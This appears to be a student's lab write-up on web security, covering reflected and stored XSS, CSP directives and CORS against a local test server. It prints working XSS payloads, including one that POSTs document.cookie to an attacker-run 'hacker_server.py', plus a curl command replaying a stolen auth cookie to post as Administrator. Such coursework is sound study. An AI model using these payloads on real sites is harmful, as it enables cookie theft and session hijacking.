# P2 - Pedro Pinto 115304

## Cross-Site Scripting (XSS)

### Reflected Cross-Site Scripting
```
http://0.0.0.0:6543/search?q=%3Cscript%3Ewindow.location.replace(%22http://www.w3schools.com%22);%3C%2Fscript%3E
```

### Stored Cross-Site Scripting
```html
<img onready="alert(document.cookie)" src="http://placehold.it/64x64"/>
```

### Cross-Site Scripting Forgery
First, cross-site with cookie's information. This is made by using ajax in a POST method to our `hacker_server.py` server

```html
<img onclick="$.ajax({
  url: 'http://127.0.0.1:8000/cookie',
  type: 'POST',
  data: 'username=Administrator&cookie=' + document.cookie,
})
" src="http://placehold.it/64x64"/>
```

After getting the cookie via `hacker_server.py`, request the vulnerable server to create a new post (only authenticated users can create new posts!!):

```bash
curl 'http://0.0.0.0:6543/add_post' -X POST --cookie "auth_tkt=634c6fa21abcd6b41e57860edc301e9b3a23e639da12049a6dbd51174171abe9256ab3f8beb3c2f97f5ee1ecd5d1a5cf0b2abbb5e74e84b323a58e19e2493c7d6701ae42QWRtaW5pc3RyYXRvcg==\!userid_type:b64unicode" -d "title=HACKED&content=hacked by pedro"
```

## Content-Security-Policy (CSP)

Source list reference:
 - **\***
 - **'none'**
 - **'self'**
 - **unsafe-inline**: Allows use of inline source elements such as style attribute, onclick, or script tag bodies and `javascript`

CSP Directive Reference:
 - **default-src**: default policy for fetchinf resources such as JS, img, css,.... An example for blocking everything, except from inside the server and the Content Delivery Network (CDN) is:
    ```
    default-src 'self' cdn.jsdelivr.com
    ```
    Scripts can only be loaded from the local server or `cdn.jsdelivr.net` a known, and probably safe CDN
 - **scipt-src**: Define valid sources of JavaScript
    ```
    script-src 'self' js.example.com
    ```
 - **style-src**: Define valid sources of stylesheets or CSS.
    ```
    style-src 'self' css.example.com
    ```
 - **connect-src**: Applies to `XMLHttpRequest` (AJAX), `WebSocket`, `fetch()`, `<a ping>`. If not allowed the browser emulates a 400 HTTP status code.
    ```
    connect-src 'self';
    ```

## Cross-Origin Resource Sharing (CORS)

Notice that:
 - **CORS** controls who can access your server's resources.
 - **CSP** controls what content can run on your website, protecting it from malicious code execution.

**CORS** is a security mechanism implemented by web browsers that controls how resources (like APIs, fonts, etc.) are requested from different domains than the one serving the web page. By default, web browsers block requests to other domains for security reasons (called the same-origin policy). CORS allows you to bypass this restriction in a controlled way. 

Example: You want to let requests from http://internal:6543 access your API at http://external:8000. CORS would define that relationship in the response headers:
```
Access-Control-Allow-Origin: https://internal:6543
Access-Control-Allow-Methods: GET, POST, DELETE
```
In the external server you must also implement `do_OPTIONS(self)` and `do_<method>(self)`, for handling requests properly.

Example of an attack payload:
```html
<img onload="$.ajax({
  url: 'http://external:8000/smile.jpg',
  type: 'DELETE',
  success: function() { alert('smile.jpg loaded')
 },
})
" src="http://placehold.it/64x64">
```

